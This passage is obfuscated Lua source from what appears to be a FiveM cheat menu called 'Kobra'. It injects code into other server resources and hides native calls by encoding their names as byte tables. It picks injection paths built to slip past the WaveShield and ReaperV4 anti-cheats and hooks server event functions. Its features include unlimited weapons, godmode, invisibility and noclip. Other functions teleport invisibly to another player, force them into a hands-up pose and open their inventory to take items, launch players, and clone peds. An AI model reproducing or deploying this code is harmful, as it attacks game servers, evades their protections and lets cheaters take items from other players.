                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v247) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v248,v249,v250) local v251=866 -(39 + 827) ;local v252;local v253;while true do if (v251==0) then if ( not v249 or ( #v249==0)) then return;end v252=tonumber(v249[2 -1 ]);v251=2 -1 ;end if (v251==(3 -2)) then if  not v252 then return;end v250=v250 or (4605 -1605) ;v251=1 + 1 ;end if (v251==(8 -5)) then CreateThread(function() local v701=GetPlayerFromServerId(v252);if ( not v701 or (v701== -(1 + 0))) then return;end local v702=GetPlayerPed(v701);if ( not v702 or  not DoesEntityExist(v702)) then return;end local v703=PlayerPedId();if  not v703 then return;end local v704=GetEntityCoords(v703);local v705=GetEntityCoords(v702);if ( not v704 or  not v705) then return;end local v706= #(v704-v705);local v707=false;local v708=nil;if (v706>10) then v708=v704;local v840=math.random() * (2 -0) * math.pi ;local v841=math.random(109 -(103 + 1) ,9);local v842=math.cos(v840) * v841 ;local v843=math.sin(v840) * v841 ;local v844=vector3(v705.x + v842 ,v705.y + v843 ,v705.z);SetEntityCoordsNoOffset(v703,v844.x,v844.y,v844.z,false,false,false);SetEntityVisible(v703,false,0);v707=true;Wait(654 -(475 + 79) );end local v709=v253(v705,v250);if ( #v709==(0 -0)) then end ClearPedTasksImmediately(v703);for v768=3 -2 ,2 + 13  do if  not DoesEntityExist(v702) then break;end local v769=GetEntityCoords(v702);if  not v769 then break;end SetEntityCoords(v703,v769.x,v769.y,v769.z + 0.5 ,false,false,false,false);Wait(45 + 5 );AttachEntityToEntityPhysically(v703,v702,0,0,1503 -(1395 + 108) ,0 -0 ,150,1204 -(7 + 1197) ,0 + 0 ,0 + 0 ,0,319 -(27 + 292) ,1,false,false,1,5 -3 );Wait(50);DetachEntity(v703,true,true);Wait(100);end Wait(637 -137 );ClearPedTasksImmediately(v703);if v708 then local v845=0 -0 ;while true do if (v845==(1 -0)) then SetEntityCoords(v703,v708.x,v708.y,v708.z,false,false,false,false);break;end if ((0 -0)==v845) then SetEntityCoords(v703,v708.x,v708.y,v708.z + (140 -(43 + 96)) ,false,false,false,false);Wait(100);v845=1;end end end if v707 then SetEntityVisible(v703,true,0);end end);break;end if (v251==2) then v253=nil;function v253(v710,v711) local v712={};local v713=PlayerPedId();if  not v713 then return v712;end for v770=0 -0 ,255 do local v771=0 -0 ;local v772;while true do if (v771==(0 + 0)) then v772=GetPlayerFromServerId(v770);if (v772 and (v772~= -(1 + 0)) and DoesEntityExist(GetPlayerPed(v772))) then local v1028=GetPlayerPed(v772);local v1029=GetEntityCoords(v1028);if v1029 then local v1170= #(v710-v1029);if (v1170<=v711) then table.insert(v712,{player=v772,serverId=v770});end end end break;end end end return v712;end v251=5 -2 ;end end end;v12.HandleClonePlayer=function(v254,v255) if ( not v255 or ( #v255==0)) then return;end local v256=table.concat(v255,",");MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v256));end;v12.HandleTakeInventory=function(v257,v258) local v259=0;local v260;local v261;while true do if (v259==(1 + 1)) then v261=GetResourceState("WaveShield")=="started" ;if v261 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v260));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v260));end break;end if ((1 -0)==v259) then if  not v260 then return;end print("Take Inventory action executed for players: "   .. table.concat(v258,", ") );v259=1 + 1 ;end if ((0 + 0)==v259) then if ( not v258 or ( #v258==(1751 -(1414 + 337)))) then return;end v260=tonumber(v258[1941 -(1642 + 298) ]);v259=1;end end end;v12.BuildMenuFromWeaponList=function(v262,v263) local v264={};for v335,v336 in ipairs(v263) do if v46[v336] then v264[ #v264 + 1 ]=v46[v336].label;end end return v264;end;v12.GetWeaponModelFromLabel=function(v265,v266) local v267=0 -0 ;while true do if ((0 -0)==v267) then for v714,v715 in pairs(v46) do if (v715.label==v266) then return v714;end end return "";end end end;v12.RepairVehicle=function(v268) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v92=GetResourceState("ReaperV4")=="started" ;local v93=GetResourceState("WaveShield")=="started" ;local v94=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v269) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v337={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v93 then TriggerEvent("deathscreen:revive");elseif v92 then MachoInjectThread(0,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v93 then TriggerEvent("deathscreen:revive");elseif v92 then MachoInjectThread(0 + 0 ,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v94 then if v92 then MachoInjectThread(972 -(357 + 615) ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() print("2");local v526=GetResourceState("WaveShield")=="started" ;local v527=GetResourceState("ReaperV4")=="started" ;if v526 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v527 then MachoInjectThread(0 + 0 ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end end,["mc9-medicsystem"]=function() local v528=0;local v529;local v530;while true do if (v528==0) then print("1");v529=GetResourceState("WaveShield")=="started" ;v528=1;end if (v528==(2 -1)) then v530=GetResourceState("ReaperV4")=="started" ;if v529 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v530 then MachoInjectThread(0 + 0 ,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end end end};for v531,v532 in pairs(v337) do if (GetResourceState(v531)=="started") then v532();end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=80 + 20 ,min=0,max=100,step=1,onSelect=function(v338) SetEntityHealth(PlayerPedId(),v338 + 7 + 93 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=1401 -(384 + 917) ,min=697 -(128 + 569) ,max=1643 -(1407 + 136) ,step=1888 -(687 + 1200) ,onSelect=function(v339) SetPedArmour(PlayerPedId(),v339);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),100);end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v340) v269:HandleGodmodeToggle(v340);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v341) if v341 then v269:EnableInvisibility();else v269:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=64.25 -(29 + 35) ,step=0.25 -0 ,min=0.25 -0 ,max=5,onSelect=function(v342,v343) if v343 then local v588=0 -0 ;while true do if (v588==(0 + 0)) then if  not v29 then local v925=1012 -(53 + 959) ;while true do if (v925==(408 -(312 + 96))) then v12:Notify("info","Kobra","Initializing... Please wait!",1735 -735 );Wait(400);v925=1;end if (v925==(286 -(147 + 138))) then v29=true;break;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v342   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

